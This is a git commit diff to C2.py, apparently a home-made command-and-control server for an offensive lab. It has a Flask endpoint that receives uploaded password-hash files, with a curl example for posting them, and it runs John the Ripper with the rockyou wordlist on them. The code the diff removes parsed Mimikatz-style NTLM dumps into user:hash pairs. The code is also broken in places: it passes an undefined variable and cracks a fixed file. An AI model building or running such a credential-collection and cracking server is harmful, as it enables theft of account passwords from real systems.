7671889cd47c037c0f9334dfbf82231861565f51
KAH HOWE WOO <46815334+JustAyce@users.noreply.github.com>
2022-10-22 12:18:49 +0800

    Update C2.py

--- C2.py
+++ C2.py
@@ -1,24 +1,29 @@
-import re
-import socket
-from flask import Flask, render_template, request
+import os
 import subprocess
-UPLOAD_FOLDER = '~/'
+from flask import render_template
+from flask import Flask, flash, redirect, request
+
+UPLOAD_FOLDER = '/home/kali/Desktop'
 app = Flask(__name__)
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+
 
 @app.route('/', methods=['GET', 'POST'])
 def upload():
-    if request.method == "POST":
+    if request.method == 'POST':
         if 'file' not in request.files:
-            return ("no files :(")
-        file = request.files['files']
+            return ('No file :(')
+
+        file = request.files['file']
         if file:
-            f = os.path.join.app.config['UPLOAD_FOLDER'], file.filename
-            file.save(f)
-            if os.stat(f).st_size != 0:
+            file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
+            if os.stat(os.path.join(app.config['UPLOAD_FOLDER'], file.filename)).st_size != 0:
+                print('yep')
                 crack_hash(f)
-                return "Nice"
-# curl -X POST -F file=@hash.txt http://127.0.0.1:5000
-app.run()
+                return ('nice')
+            return "empty file"
+    # curl -X POST -F file=@hash.txt http://127.0.0.1:5000
+    return ('upload.html')
 
 def crack_hash(f):
     command = "sudo john --format=LM --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt > cracked.txt"
@@ -26,24 +31,5 @@ def crack_hash(f):
     print(proc.pid)
     return True
 
-
-def format_hash():
-    with open(r"C:\Temp\hash.txt",'r') as d:
-        data = d.read()
-
-    d.close()
-
-    x = re.findall("User : [a-zA-Z0-9\r\w\n\t\s]* Hash NTLM: [a-zA-Z0-9]*", data)
-    with open(r"C:\Temp\NTLM_hash.txt",'w')as w:
-        for NTLM in x:
-            segs = NTLM.split(": ")
-            user = segs[1].split("\n")[0]
-            hash = segs[2]
-            w.write(f'{user}:{hash}\n')
-            # print(f"{user}:{hash}")
-    # john --format=LM --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt > cracked.txt
-
-    return True
-
-# format_hash()
-
+if __name__ == '__main__':
+    app.run()
